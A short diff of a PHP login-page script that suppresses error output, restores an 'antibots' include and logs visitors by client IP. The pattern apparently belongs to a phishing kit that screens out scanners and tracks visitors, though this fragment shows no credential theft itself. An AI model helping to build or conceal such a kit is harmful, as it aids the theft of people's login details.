@@ -1,11 +1,10 @@
 <?php
-    error_reporting(E_ALL);
+    error_reporting(0);
     session_start();
 
-    // Temporarily skip problematic includes for testing
-    // include __DIR__ . "/../antibots-debug/antibots.php";
+    include __DIR__ . "/../antibots-debug/antibots.php";
     include __DIR__ . '/../setting/functions.php';
-    // include __DIR__ . '/../includes/current-page.php';
+    include __DIR__ . '/../includes/current-page.php';
     $ip = get_client_ip();
     $get_name_file = str_replace(".", "-", $ip);
     $get_name_page = "Page Login";
